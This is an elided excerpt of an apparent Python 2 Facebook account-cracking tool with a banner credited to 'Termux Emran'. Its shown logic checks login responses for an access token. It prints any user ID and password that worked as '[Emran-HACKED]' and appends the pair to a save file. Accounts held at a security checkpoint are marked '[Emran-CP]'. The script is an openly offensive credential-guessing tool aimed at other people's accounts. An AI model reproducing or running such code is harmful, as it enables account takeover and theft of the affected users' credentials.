...
\033[0;94m____ _    ____ ___  __   
\033[0;94m| __\|\/\ | . \|  \ | \|\
|\033[0;94m  ]_|   \|  <_| . \|  \|
\033[0;94m|___/|/v\/|/\_/|/\_/|/\_/
""")
...
def menu():
    ...
    print '\033[0;94mFACEBOOK : Termux  Emran'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Emran-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Emran-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
